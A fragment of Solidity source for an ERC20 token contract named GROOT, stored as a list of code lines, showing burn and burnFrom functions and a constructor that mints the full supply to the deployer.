{ERC20-_burn}.\n', '         */\n', '        function burn(uint256 amount) public virtual {\n', '            _burn(_msgSender(), amount);\n', '        }\n', '    \n', '  \n', '        function burnFrom(address account, uint256 amount) internal virtual {\n', '            uint256 decreasedAllowance = allowance(account, _msgSender()).sub(amount, "ERC20: burn amount exceeds allowance");\n', '            _approve(account, _msgSender(), decreasedAllowance);\n', '            _burn(account, amount);\n', '        }\n', '        \n', '    }\n', '    \n', '    contract GROOT is ERC20, ERC20Burnable {\n', '      constructor(string memory _name, string memory _symbol, uint256 totalSupply) public ERC20(_name, _symbol) {\n', '        _mint(msg.sender, totalSupply);\n', '      }\n', '    }']